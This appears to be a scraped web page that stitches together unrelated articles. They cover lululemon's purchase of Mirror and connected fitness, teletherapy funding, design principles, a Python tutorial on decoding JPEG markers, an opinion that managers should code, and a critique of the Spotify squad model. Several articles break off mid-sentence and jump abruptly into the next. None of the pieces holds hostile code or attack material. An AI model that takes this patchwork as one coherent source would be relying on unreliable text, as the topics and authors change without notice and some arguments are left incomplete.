<p>In the end, joining forces with lululemon was more compelling than slugging it out with Peloton or adhering to the “third screen” narrative.</p>
        </div>
      </div>

            <div>
        <div>
                      <h2>Lulu x Mirror</h2>
          
          <p>Upon announcing the deal, lululemon’s stock jumped, and onlookers have been quick to heap on the praise.</p>
<p>According to Bank of America analysts, Mirror could generate&nbsp;<a href="https://www.marketwatch.com/amp/story/lululemon-acquisition-mirror-could-generate-700-million-and-reach-600000-subscribers-by-2023-bank-of-america-2020-07-01" target="_blank" rel="noopener">$700M</a>&nbsp;in revenue and reach 600,000 subscribers by 2023.</p>
<p>To realize this lofty forecast, lululemon will sell Mirrors to its existing customer base, starting with its 489 corporate-owned stores across the globe. The retailer will continue creating content for the platform, where Mirror instructors will be clad in lululemon gear. More than simply selling more apparel, Mirror’s ability to generate recurring revenue and strengthen lulu’s relationship with consumers is the chief aim of this acquisition.</p>
<p>While the hard work of transforming an athleisure retailer into a tech company is just beginning, it will be difficult to criticize lululemon for shooting this shot. Whether or not they can keep growing will be the question on everyone’s mind:</p>
<p><em>“Lulu is showing no signs of slowing down, but acquisitions made outside a retailer’s core skill set have rarely been seamless. There is nothing bad about the story right now. The scariest thing [for investors] about Lulu is, is this as good as it gets?”</em>&nbsp;– Simeon Siegel, managing director &amp; senior retail analyst at BMO Capital Markets.</p>

                      <h2>💻 Closing the Gap </h2>
          
          <p>Teletherapy is gaining traction during the pandemic. It just might be the key to unlocking access for millions of individuals battling mental illness.</p>
<p>There’s a&nbsp;<a href="https://insider.fitt.co/wellness-startups-mental-health/" target="_blank" rel="noopener">shocking gap</a>&nbsp;between demand (those in need of care) and supply (access to affordable care).</p>
<ul>
<li>46M Americans report experiencing mental illness each year, while only 42.6% received treatment.</li>
<li>Individuals who are able to access care will wait an average of&nbsp;<a href="https://www.psychiatryadvisor.com/home/practice-management/long-wait-times-typical-for-psychiatry-appointments/" target="_blank" rel="noopener">25 days</a>&nbsp;for an appointment.</li>
<li>With in-room therapy costing $150–$400 per session, plus the added cost of medication,&nbsp;<a href="https://www.kff.org/medicaid/report/mental-health-financing-in-the-united-states/" target="_blank" rel="noopener">45%</a>&nbsp;of untreated individuals cite cost as a barrier.</li>
</ul>
<p><strong>Pros:</strong>&nbsp;During COVID, the majority of therapists switched from in-person to remote therapy. A recent&nbsp;<a href="https://www.apaservices.org/practice/legal/technology/psychologists-embrace-telehealth" target="_blank" rel="noopener">survey</a>&nbsp;found that three quarters of clinicians are exclusively using teletherapy. The fact that teletherapy has been&nbsp;<a href="https://pubmed.ncbi.nlm.nih.gov/26864655/" target="_blank" rel="noopener">shown to be</a>&nbsp;just as effective as in-person therapy for treating PTSD, depression, and anxiety helped solidify the switch.</p>
<p><strong>Cons:</strong>&nbsp;The convenience and flexibility of remote care have proven beneficial, but concerns related to privacy regulations, insurance coverage, Zoom fatigue, and missing non-verbal cues leave a lot of room for improving the experience.</p>
<p>As consumer demand for digital behavioral health grows, investors are seizing the moment.</p>
<ul>
<li>According to&nbsp;<em>Rock Health</em>, in the first half of 2020, digital behavioral health companies received&nbsp;<a href="https://rockhealth.com/reports/2020-midyear-digital-health-market-update-unprecedented-funding-in-an-unprecedented-time/" target="_blank" rel="noopener">$588M</a>&nbsp;in funding — a number equal to the annual funding for this category in any previous year.</li>
</ul>
<p><strong>Looking ahead:</strong>&nbsp;With anxiety and isolation at an&nbsp;<a href="https://insider.fitt.co/insider-newsletter-issue-82-ending-addiction/" target="_blank" rel="noopener">all-time high</a>, the need to confront the&nbsp;<a href="https://insider.fitt.co/wellness-startups-mental-health/" target="_blank" rel="noopener">mental health crisis</a>&nbsp;has never been greater. A bright spot amid the pandemic, digital behavioral health is&nbsp;<a href="https://insider.fitt.co/wellness-startups-stigma/" target="_blank" rel="noopener">destigmatizing</a>&nbsp;and expanding access to care.</p>

          <p>Liteboxer, the latest&nbsp;<a href="https://us15.campaign-archive.com/?u=4c6bc12e271bc681951ed945a&amp;id=f14e6a628d" target="_blank" rel="noopener">Peloton of ‘X’</a>&nbsp;upstart, is taking aim at boxing within the booming connected fitness category.</p>
<p><strong>What it is:</strong>&nbsp;A competitor to FightCamp, an interactive at-home boxing experience, Liteboxer offers a free-standing, light-up punching bag for $1,495 and a $29/month content subscription.</p>
<p><strong>How it works:</strong>&nbsp;While FightCamp offers punch tracking technology and a variety of workouts from “real fighters”, Liteboxer looks a lot like Dance Dance Revolution for boxing. Flashing lights synced to music tell users where to hit and a force-tracking bag measures performance.</p>
<p><strong>Looking ahead:</strong>&nbsp;Following in Peloton’s footsteps is tempting, but surely at-home fitness has a ceiling — especially when every piece of equipment costs $1,500 or more.</p>
<p>For their part, Peloton appears to be rethinking the category a bit. The company was rumored to be working on a connected rower à la Hydrow. But recently, CFO Jill Woodworth&nbsp;<a href="https://outline.com/9fv3sB" target="_blank" rel="noopener">said</a>&nbsp;the company will forgo the rower, for now, in favor of a cheaper treadmill. Woodworth also said developing a product for the “boot camp category” is a priority. Is Peloton’s Mirror competitor in the works?</p>

        <p>Design is a broad topic. This post won’t approach the adjective qualifying a style with simple forms and a pure appearance. No. Design is broader than a sleek car or an harmonious living room.</p>

<p>Design is a creative activity that aims to invent, improve and solve problems. Life is full of them, in various domains, which pushes people to eventually become a designer of something. Whether you’re conceiving a recipe, an apartment layout, a software or a rocket you are designing. By learning the fundamentals, you will arm yourself for various situations. Here is a list of the best pragmatic principles I’ve learned to better design. In spite of their obviousness and renown, my experience has shown me that some of these principles are often forgotten.</p>

<p><strong>Fun fact</strong>: In english, <em>to design</em> means both <em>to draw</em> and <em>to conceive according to a plan</em>. Similarly in French, the word <em>dessin</em> (a drawing) derives its etymology from the word <em>dessein</em> (have the intention).</p>

<h2 id="incremental-improvement">Incremental improvement</h2>

<p>Believing you can do it right the first time is naive at best, pretentious at worst. <strong>You will fail and have to accept it</strong>. Do not postpone but instead <strong>release fast</strong>, get feedback early and iterate to make it better. You will find many references, notably on Lean Startup, DevOps culture or Site Reliability Engineering, which encourage <strong>a quick redesign capability rather than a perfect design at the first place</strong>.</p>

<blockquote>
  <p>To write clean code, you must first write dirty code and then clean it. […]
Learning to write clean code is hard work. It requires more than just the knowledge of principles and patterns. You must sweat over it. You must practice it yourself, and watch yourself fail. Robert C. Martin — Clean Code: A Handbook of Agile Software Craftsmanship</p>
</blockquote>

<h2 id="reuse-what-exists">Reuse what exists</h2>

<p>It is unlikely that the problem you face is fundamentally new. Before making any effort, look for <strong>existing solutions</strong> or proven practices. <strong>Be humble</strong> and accept you can’t compete with years of expertise on a subject. If so, the motivation to develop the new model must come from reaching the limits of the previous one. In software engineering for instance, <a href="https://en.wikipedia.org/wiki/Software_design_pattern">design patterns</a> are formalized best practices that the programmer can use to solve common problems when designing an application or system.</p>

<p>Don’t limit yourself to the area of the original problem, sometimes a similar problem has been found and solved long before in <strong>a different field</strong>. Learn about <a href="https://en.wikipedia.org/wiki/Queueing_theory">queuing theory</a> will help you to write an operating system scheduler as well as being frustrated in a supermarket queue. Solutions come from fields of experiences and theories that you would not necessarily expect.</p>

<h2 id="five-whys">Five whys</h2>

<p>The <a href="https://en.wikipedia.org/wiki/Five_whys">Five whys technique</a>, originally developed by Toyota, has been mostly used for exploring the root cause of a defect in a system. It involves asking the relevant question starting with a why in order to find the source which cause the failure. Adapt this technique to find out what really matter in our design. For example, “<em>We need a program which exports our documentation to PDF</em>”:</p>

<ol>
  <li>Why? - So the export can go on the website.</li>
  <li>Why? - Because our customers has to read it.</li>
  <li>Why? - Because they require it to maintain the software.</li>
  <li>Why (don’t they have access to the documentation like everyone else)? - Because they haven’t been integrated into our platform.</li>
  <li>Why? Because they have never been on-board on the platform.</li>
</ol>

<p><strong>Decision</strong>: instead of developing a complex program which exports PDF, write a simple on-boarding guide for the customers.</p>

<p>This situation often occurs when the given requirement includes the design. Before answering the question <em>“How do we do it?”</em> directly, the first and most important step is to remember “<em>Why do we do it?</em>”. Once you have understood the <strong>root reasons</strong> and constraints for the requirement, it clears the path on how to get there and can <strong>prevent</strong> you from taking <strong>very long detours</strong> in addition to <strong>simplifying</strong> the design.</p>

<h2 id="keep-it-simple-stupid">Keep it simple stupid</h2>

<p><strong>Resolve problems, don’t create them</strong>. You should be suspicious of providing a solution that makes the overall system more complicated than before. Remember: You’ll have to maintain everything you build, so you’d better build as little and simply as possible.</p>

<p>Simple designs are easy to <strong>learn</strong>, easy to <strong>teach</strong>, easy to <strong>use</strong> and therefore easily <strong>appeal</strong> to customers. It forces the design to be intuitive and obvious, reducing the learning curve and facilitates the adoption. Like Denis Diderot says in Pensées sur l’interprétation de la nature:</p>

<blockquote>
  <p>These books [of Sthal and Newton] were just waiting to be heard, to be valued for what they were worth; and it would not have cost their authors more than a month to make them clear; that month would have spared three years of labor and exhaustion to a thousand good spirits.</p>
</blockquote>

<p>But what is a simple design? In the <a href="https://landing.google.com/sre/sre-book/chapters/simplicity/">Simplicity chapter of the Site Reliability Engineering</a> book of Google, they mention a great quote from the French poet Antoine de Saint Exupery about perfection which could fit very well with simplicity:</p>

<blockquote>
  <p>perfection is finally attained not when there is no longer more to add, but when there is no longer anything to take away - A. de Saint Exupéry, Terre des Hommes</p>
</blockquote>

<h2 id="perfect-is-the-enemy-of-good-enough">Perfect is the enemy of good enough</h2>

<p><a href="https://www.pinterest.de/pin/397724210839705109/"><img src="https://reflexio.debec.eu/assets/moka-pot.svg" alt="moka"></a></p>

<p>The moka coffee maker may not produce perfect coffee, but it requires so little maintenance compared to a large coffee machine with radiators, pipes, grinder, etc. that it makes the compromise “complexity / coffee taste” great.</p>

<p>Remember the <a href="https://en.wikipedia.org/wiki/Pareto_principle">Pareto principle</a>: in general <strong>80% of a things can be done in 20%</strong> of the total allocated time. Conversely, the hardest <strong>20% left takes 80%</strong> of the time. Perfection requires infinite time and energy. This is impossible and therefore should not be part of your design.</p>

<blockquote>
  <p>Beware of the perfection pitfall and design your architecture only as good as necessary and not as good as ultimate possible. - Ralf S. Engelschall</p>
</blockquote>

<h2 id="postpone-complexity">Postpone complexity</h2>

<p>Simplicity and incremental improvement principles give birth to a another principle: <strong>Postpone complexity</strong>. Complexity lies in early optimization, as Donald E. Knuth points out in his article <a href="https://dl.acm.org/doi/pdf/10.1145/361604.361612?download=true">Computer Programming as Art</a> with “<em>premature optimization is the root of all evil</em>”. Focus on designing something that works instead of something finely tune that does not.</p>

<p>Complexity lies also in early generalization. Focus on designing something that works in a single use case rather than something that will not work in many. When designing a coffee machine, first design something that makes a simple black coffee. If you plan ahead to include all extra options for latte, cappuccino or irish coffee you will end up not making a simple back coffee. As elegantly summarized by Ralf S. Engelschall: “<em>Use before reuse</em>”.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Do you think there’s a principle missing? Send me your comments! This list will certainly be extended and refined, subscribe to the <a data-formkit-toggle="78a863d4eb" href="https://reflexio-debec.ck.page/78a863d4eb">newsletter</a> if you wish to be notified about it. In the meantime, how are you going to ensure that you do not forget to implement the principles you have just learned?</p>

<p>Hi everyone! 👋 Today we are going to understand the JPEG compression algorithm. One thing a lot of people don’t know is that JPEG is not a format but rather an algorithm. The JPEG images you see are mostly in the JFIF format (JPEG File Interchange Format) that internally uses the JPEG compression algorithm. By the end of this article, you will have a much better understanding of how the JPEG algorithm compresses data and how you can write some custom Python code to decompress it. We will not be covering all the nuances of the JPEG format (like progressive scan) but rather only the basic baseline format while writing our decoder.</p>

<h2 id="introduction">Introduction</h2>

<p>Why write another article on JPEG when there are already hundreds of articles on the internet? Well, normally when you read articles on JPEG, the author just gives you details about what the format looks like. You don’t implement any code to do the actual decompression and decoding. Even if you do write code, it is in C/C++ and not accessible to a wide group of people. I plan on changing that by showing you how a basic JPEG decoder works using Python 3. I will be basing my decoder on <a href="https://github.com/aguaviva/micro-jpeg-visualizer/blob/master/micro-jpeg-visualizer.py">this</a> MIT licensed code but will be heavily modifying it for increased readability and ease of understanding. You can find the modified code for this article on my  <a href="https://github.com/yasoob/Baseline-JPEG-Decoder">GitHub repo</a>.</p>

<h2 id="different-parts-of-a-jpeg">Different parts of a JPEG</h2>

<p>Let’s start with this nice image by <a href="https://twitter.com/angealbertini">Ange Albertini</a>. It lists all different parts of a simple JPEG file. Take a look at it. We will be exploring each segment. You might have to refer to this image quite a few times while reading this tutorial.</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/bdc1363abbd5744200ec5283d4154e55143df86c/8c624/images/decoding_jpeg/jpegrgb_dissected.png" alt="JPEGRGB_dissected.png"></p>

<p>At the very basic level, almost every binary file contains a couple of markers (or headers). You can think of these markers as sort of like bookmarks. They are very crucial for making sense of a file and are used by programs like <code>file</code> (on Mac/Linux) to tell us details about a file. These markers define where some specific information in a file is stored. Most of the markers are followed by <code>length</code> information for the particular marker segment. This tells us how long that particular segment is.</p>

<h3 id="file-start-file-end">File Start &amp; File End</h3>

<p>The very first marker we care about is <code>FF D8</code>. It tells us that this is the start of the image. If we don’t see it we can assume this is some other file. Another equally important marker is <code>FF D9</code>. It tells us that we have reached the end of an image file. Every marker, except for <code>FFD0</code> to <code>FFD9</code> and <code>FF01</code>, is immediately followed by a length specifier that will give you the length of that marker segment. As for the image file start and image file end markers, they will always be two bytes long each.</p>

<p>Throughout this tutorial, we will be working with this image:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/7344493a5ee7126f8286dd83ade191cab9e7f292/fbea3/images/decoding_jpeg/profile.jpg" alt="Profile"></p>

<p>Let’s write some code to identify these markers.</p>

<pre><code>from struct import unpack


marker_mapping = {
    0xffd8: "Start of Image",
    0xffe0: "Application Default Header",
    0xffdb: "Quantization Table",
    0xffc0: "Start of Frame",
    0xffc4: "Define Huffman Table",
    0xffda: "Start of Scan",
    0xffd9: "End of Image"
}


class JPEG:
    def __init__(self, image_file):
        with open(image_file, 'rb') as f:
            self.img_data = f.read()
    
    def decode(self):
        data = self.img_data
        while(True):
            marker, = unpack("&gt;H", data[0:2])
            print(marker_mapping.get(marker))
            if marker == 0xffd8:
                data = data[2:]
            elif marker == 0xffd9:
                return
            elif marker == 0xffda:
                data = data[-2:]
            else:
                lenchunk, = unpack("&gt;H", data[2:4])
                data = data[2+lenchunk:]            
            if len(data)==0:
                break        

if __name__ == "__main__":
    img = JPEG('profile.jpg')
    img.decode()    

# OUTPUT:
# Start of Image
# Application Default Header
# Quantization Table
# Quantization Table
# Start of Frame
# Huffman Table
# Huffman Table
# Huffman Table
# Huffman Table
# Start of Scan
# End of Image
</code></pre>

<p>We are using <a href="https://docs.python.org/3/library/struct.html">struct</a> to unpack the bytes of image data. <code>&gt;H</code> tells <code>struct</code> to treat the data as big-endian and of type <code>unsigned short</code>. The data in JPEG is stored in big-endian format. Only the EXIF data <em>can</em> be in little-endian (even though it is uncommon). And a short is of size 2 so we provide <code>unpack</code> two bytes from our <code>img_data</code>. You might ask yourself how we knew it was a <code>short</code>. Well, we know that the markers in JPEG are 4 hex digits: <code>ffd8</code>. One hex digit equals 4 bits (<sup>1</sup>⁄<sub>2</sub> byte) so 4 hex digits will equal 2 bytes and a short is equal to 2 bytes.</p>

<p>The Start of Scan section is immediately followed by image scan data and that image scan data doesn’t have a length specified. It continues till the “end of file” marker is found so for now we are manually “seeking” to the EOF marker whenever we see the SOC marker.</p>

<p>Now that we have the basic framework in place, let’s move on and figure out what the rest of the image data contains. We will go through some necessary theory first and then get down to coding.</p>

<h2 id="encoding-a-jpeg">Encoding a JPEG</h2>

<p>I will first explain some basic concepts and encoding techniques used by JPEG and then decoding will naturally follow from that as a reverse of it. In my experience, directly trying to make sense of decoding is a bit hard.</p>

<p>Even though the image below won’t mean much to you right now, it will give you some anchors to hold on to while we go through the whole encoding/decoding process. It shows the steps involved in the JPEG encoding process: (<a href="https://users.cs.cf.ac.uk/Dave.Marshall/Multimedia/node234.html">src</a>)</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/7237dd0093b6a8070b2c927673fd73bc797561d2/33b0a/images/decoding_jpeg/encoding.png" alt="JPEG Encoding process"></p>

<h3 id="jpeg-color-space">JPEG Color Space</h3>

<p>According to the JPEG spec (<a href="http://www.itu.int/rec/T-REC-T.872-201206-I/en">ISO/IEC 10918-6:2013 (E)</a>, section 6.1):</p>

<blockquote>
<ul>
<li>Images encoded with only one component are assumed to be grayscale data in which 0 is black and 255 is white.</li>
<li>Images encoded with three components are assumed to be RGB data encoded as YCbCr unless the image contains an APP14 marker segment as specified in 6.5.3, in which case the color encoding is considered either RGB or YCbCr according to the application data of the APP14 marker segment. The relationship between RGB and YCbCr is defined as specified in Rec. ITU-T T.871 | ISO/IEC 10918-5.</li>
<li>Images encoded with four components are assumed to be <strong>CMYK</strong>, with (0,0,0,0) indicating white unless the image contains an APP14 marker segment as specified in 6.5.3, in which case the color encoding is considered either <strong>CMYK</strong> or <strong>YCCK</strong> according to the application data of the APP14 marker segment. The relationship between <strong>CMYK</strong> and <strong>YCCK</strong> is defined as specified in clause 7.</li>
</ul>
</blockquote>

<p>Most JPEG algorithm implementations use luminance and chrominance (YUV encoding) instead of RGB. This is super useful in JPEG as the human eye is pretty bad at seeing high-frequency brightness changes over a small area so we can essentially reduce the amount of frequency and the human eye won’t be able to tell the difference. Result? A highly compressed image with almost no visible reduction in quality.</p>

<p>Just like each pixel in RGB color space is made up of 3 bytes of color data (Red, Green, Blue), each pixel in YUV uses 3 bytes as well but what each byte represents is slightly different. The Y component determines the brightness of the color (also referred to as luminance or luma), while the U  and V components determine the color (also known as chroma). The U component refers to the amount of blue color and the V component refers to the amount of red color.</p>

<p>This color format was invented when color televisions weren’t super common and engineers wanted to use one image encoding format for both color and black and white televisions. YUV could be safely displayed on a black and white TV if color wasn’t available. You can read more about its history on <a href="https://www.wikiwand.com/en/YUV">Wikipedia</a>.</p>

<h3 id="discrete-cosine-transform-quantization">Discrete Cosine Transform &amp; Quantization</h3>

<p>JPEG converts an image into chunks of 8x8 blocks of pixels (called MCUs or Minimum Coding Units), changes the range of values of the pixels so that they center on 0 and then applies Discrete Cosine Transformation to each block and then uses quantization to compress the resulting block. Let’s get a high-level understanding of what all of these terms mean.</p>

<p>A Discrete Cosine Transform is a method for converting discrete data points into a combination of cosine waves. It seems pretty useless to spend time converting an image into a bunch of cosines but it makes sense once we understand DCT in combination with how the next step works. In JPEG, DCT will take an 8x8 image block and tell us how to reproduce it using an 8x8 matrix of cosine functions.  <a href="https://www.impulseadventure.com/photo/jpeg-minimum-coded-unit.html">Read more here</a>)</p>

<p>The 8x8 matrix of cosine functions look like this:</p>

<p><img src="https://d33wubrfki0l68.cloudfront.net/97f11adca54888172fc19cef52e514ef0e8b46fd/1a72e/images/decoding_jpeg/cosine-funcs.png" alt="Cosine functions"></p>

<p>We apply DCT to each component of a pixel separately. The output of applying DCT is an 8x8 coefficient matrix that tells us how much each cosine function (out of 64 total functions) contributes to the 8x8 input matrix. The coefficient matrix of a DCT generally contains bigger values in the top left corner of the coefficient matrix and smaller values in the bottom right corner. The top left corner represents the lowest frequency cosine function and the bottom right represents the highest frequency cosine function.</p>

<p>What this tells us is that most images contain a huge amount of low-frequency information and a small amount of high-frequency information. If we turn the bottom right components of each DCT matrix to 0, the resulting image would still appear the same because, as I mentioned, humans are bad at observing high-frequency changes. This is exactly what we do in the next step.</p>

<p>I found a wonderful video on this topic. Watch it if DCT doesn’t make too much sense.</p>

<p>We have all heard that JPEG is a lossy compression algorithm but so far we haven’t done anything lossy. We have only transformed 8x8 blocks of YUV components into 8x8 blocks of cosine functions with no loss of information. The lossy part comes in the quantization step.</p>

<p>Quantization is a process in which we take a couple of values in a specific range and turns them into a discrete value. For our case, this is just a fancy name for converting the higher …</p></section></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>Managers who can’t code are an outdated artifact of corporate America circa 2005. The best managers that I’ve had spend ~80% of their time coding, architecting, or doing technical work that requires engineering prowess. If your manager thinks coding is “beneath” them then they need a dose of humble pie. Your organization would likely be better off without them.</p>



<h2><span id="But_Managers_Manage_People">But Managers Manage <em>People</em>!</span>
</h2>



<p>There is a long-running stigma associated with developers, that we are all geeks who can’t handle interpersonal relationships. Due to our code monkey nature, we need “people people” who can go to meetings for us and communicate our efforts effectively to the higher-ups.</p>



<div><figure><img src="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg" alt="introverted programmers are an outdated meme" srcset="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg 700w, https://qvault.io/wp-content/uploads/2020/07/joke-extrovert-300x184.jpg 300w" sizes="(max-width: 700px) 100vw, 700px" data-srcset="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg 700w, https://qvault.io/wp-content/uploads/2020/07/joke-extrovert-300x184.jpg 300w" data-src="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div>



<p>While the above is still funny, it’s <em>outdated</em>. As the developer community has grown exponentially in the last 20 years, so too has the personality diversity amongst its members. In other words, it is<strong> not hard to find developers with the soft-skills </strong>necessary for management positions.</p>



<h2><span id="Managers_Should_Help">Managers Should Help</span>
</h2>



<p>I am a firm believer in the following:</p>



<figure><img src="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png" alt="" srcset="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png 1024w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-300x150.png 300w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-768x384.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png 1024w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-300x150.png 300w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-768x384.png 768w" data-src="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure><p>While the manager doesn’t need to be the most talented developer on the team, they must at least be technically literate. When a team member goes to their boss with a technical proposal, the manager should be able to give valuable feedback.</p>



<p>In this <a href="https://hbr.org/2016/12/if-your-boss-could-do-your-job-youre-more-likely-to-be-happy-at-work">study from Harvard</a> 35,000 employees from the US and Great Britain were polled about their job satisfaction, and metrics were gathered about what influenced their happiness at work. The results showed that the <em>single greatest influencing factor </em>on employee satisfaction was whether or not their boss was technically competent. I practice what I preach, so at the <a href="https://classroom.qvault.io/">Qvault app,</a> all engineering leadership will forever be responsible for pushing code.</p>



<p>Contrast the idea of a competent boss with the all-too-familiar experience of going to a <a href="https://qvault.io/2020/05/18/leave-scrum-to-rugby-i-like-getting-stuff-done/">non-technical middle-management type</a> with an engineering problem, only to be stuck in a teaching session because the boss has never heard of a pub-sub system.</p>



<figure><img src="https://qvault.io/wp-content/uploads/2020/07/9e3a6f35f44188bad76c100f3560ce69.gif" alt="" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure><h2><span id="Managers_Need_Empathy">Managers Need Empathy</span>
</h2>



<p>A good manager has empathy for those who report to them. If the boss doesn’t code or hasn’t written code in a long time, they won’t understand the daily problems that their team is faced with. A good engineering leader will not only understand modern problems, but they make it their role to actively seek technical solutions in an ever-changing innovative landscape.</p>



<h2><span id="INB4_So_the_CEO_needs_to_be_able_to_code">INB4: “So the CEO needs to be able to code?”</span>
</h2>



<p>No, but the CTO does!</p>



<p>I am sympathetic to the idea that the CTO will have plenty of business and product-related work to focus on, but they can’t let their technical chops slip. In order to run the engineering arm of an innovative company, the person at the top should have a firm mental grasp on the implementation difficulties. If this just means reviewing architectural diagrams and reviewing pull-requests so be it, but nothing beats hands-on engineering work to stay sharp.</p>

<p>Of all the allures of startup culture, few are more desireable than the speed and nimbleness of a small team. Maintaining that feeling as a company grows is a challenge. In 2012, Spotify shared its way of working and suggested it had figured it out.<sup><a href="#1">1</a></sup></p>
<p>I was excited to see <em>the Spotify model</em> in action when I interviewed for a product management role at its Stockholm headquarters in 2017. However, the recruiter surprised me before the first interview. She cautioned me to not expect Spotify to be an <a href="https://en.wikipedia.org/wiki/Agile_software_development">Agile</a> utopia.</p>
<p>I joined the company after it had tripled in size to 3,000 people over 18 months. I learned the famed squad model was only ever aspirational and never fully implemented. I witnessed organizational chaos as the company’s leaders incrementally transitioned to more traditional management structures.</p>
<p>When I asked my coworkers why the content was not removed or updated to reflect reality, I never got a good answer. Many people ironically thought the posts were great for recruiting. I no longer work at Spotify, so I am sharing my experience to set the record straight. The Spotify squad model failed Spotify and it will fail your company too.</p>

<h3>But you don’t have to take my word for it.</h3>
<p>The co-author of the Spotify model<sup><a href="#2">2</a></sup> and multiple agile coaches who worked at Spotify have been telling people to not copy it for years. Unfortunately, truth doesn’t spread as quickly or as widely as an idea people want to believe in.</p>
<blockquote>
<p>“Even at the time we wrote it, we weren’t doing it. It was part ambition, part approximation. People have really struggled to copy something that didn’t really exist.”</p>
</blockquote>
<p>—Joakim Sundén, agile coach at Spotify&nbsp;2011–2017<sup><a href="#4">4</a></sup></p>
<blockquote>
<p><em>“It worries me when people look at what we do and think it’s a framework they can just copy and implement.</em> … We are really trying hard now to emphasize we have problems as well. It’s not all ‘shiny and everything works well and all our squads are super amazing’.”</p>

<h2>Recap</h2>
<p>You can read and watch the <a href="#1">original content</a> in less than 30 minutes or <a href="#spread-4">skip to the next section</a> if you are familiar. Here is a brief summary.</p>
<p>Spotify had teams it called <em>squads</em> because it sounded cooler (not joking). A group of teams were organized into a department called a <em>tribe</em>. Each team was intended to be an autonomous mini-startup, with a product manager acting as mini-CEO for a feature area. The teams had designers and software engineers with a range of specializations. The intent was that a team should have every skill necessary without needing to rely on another team for success.</p>
<p>Product managers had a traditional management structure. A product manager for a team reported to their department’s product director (<em>“tribe lead”</em>). Same for designers. Software engineers, however, were managed outside of the team structure.</p>
</div>
</section>
<section>
<div>
<p><em>“Chapter leads”</em> managed software engineers specializing in a specific type of software development across the department. For example, all of the software engineers working on backend APIs across all the teams within the department would have one manager and all of the Android mobile engineers in the department would have a different manager. The intent was to allow engineers to be moved between teams within the department to best meet business requirements without them having to change managers.</p>

<h3>Matrix management solved the wrong problem</h3>
<p>The “full stack” agile team worked well, but the matrix management of software engineers introduced more problems than it solved.</p>
<ul>
<li><p>Teams at Spotify were rather long-lived. The benefit of not having to change manager when moving to another team was limited.</p></li>
<li><p>Engineering managers in this model had little responsibility beyond the career development of the people they managed. Even then, their ability to help with interpersonal people skills development was limited. An engineering manager would not manage enough of the other people on the team or be involved enough in the daily context to independently assess conflict within the team.</p></li>

<ul>
<li><p>Without a single engineering manager responsible for the engineers on a team, the product manager lacked an equivalent peer—the mini-CTO to their mini-CEO role. There was no single person accountable for the engineering team’s delivery or who could negotiate prioritization of work at an equivalent level of responsibility.</p><p>When disagreements within the engineering team arose, the product manager needed to negotiate with all of the engineers on the team. If the engineers could not reach a consensus, the product manager needed to escalate to as many engineering managers as there were engineering specializations within the team. A team with backend, Web app, and mobile app engineers would have at least 3 engineering managers who might need to get involved. If those engineering managers could not reach a consensus, a single team’s issue would have to escalate to the department’s engineering director.</p></li>

<p>“Chapter leads are servant-leaders who help you grow as an individual. They don’t really work with any team. They have direct reports on all the teams. They don’t have really any accountability for the delivery. They aren’t taking that responsibility. It’s easy to see the product owner as the manager for the team.”</p>

<p><strong>Learn from Spotify’s mistakes:</strong></p>
<ul>
<li>A product—design—engineering team typically contains more engineers than designers or product managers. Having a single engineering manager for the engineers on the team creates an accountable escalation path for conflict within the team.</li>
<li>Product managers should have an equivalent peer for engineering. Product managers should be accountable for the prioritization of work. Engineering managers should be accountable for the engineers’ execution, which includes being able to negotiate speed and quality tradeoffs with the product manager.</li>

<section id="too-much-autonomy">

<h3>Spotify fixated on team autonomy</h3>
<p>When a company is small, teams have to do a wide range of work to deliver and have to shift initiatives frequently. As a company grows from startup to scale-up, duplicated functions across teams move to new teams dedicated to increasing organization efficiency by reducing duplication. With more teams, the need for a team to shift initiative decreases in frequency. Both of these changes allow for teams to think more deeply and long term about the problems they are scoped to solve. Faster iteration, however, is not guaranteed. Every responsibility a team cedes to increase its focus becomes a new cross-team dependency.</p>
<p>Spotify did not define a common process for cross-team collaboration. Allowing every team to have a unique way of working meant each team needed a unique way of engagement when collaborating. Overall organization productivity suffered.</p>
<p>The Spotify model was documented when Spotify was a much smaller company. It was supposed to be a multiple part series, according to Anders Ivarsson. Autonomy made the first cut, but the parts on alignment and accountability were never completed.</p>

<div>
<p><strong>Learn from Spotify’s mistakes:</strong></p>
<ul>
<li>Autonomy requires alignment. Company priorities must be defined by leadership. Autonomy does not mean teams get to do whatever they want.</li>
<li>Processes for cross-team collaboration must be defined. Autonomy does not mean leaving teams to self-organize every problem.</li>
<li>How success is measured must be defined by leadership so people can effectively negotiate cross-team dependency prioritization.</li>
<li>Autonomy requires accountability. Product management is accountable for value. The team is accountable for delivering ‘done’ increments. Mature teams can justify their independence with their ability to articulate business value, risk, learning, and the next optimal move.<sup><a href="#6">6</a></sup></li>

<div>
<h3>Collaboration was an assumed competency</h3>
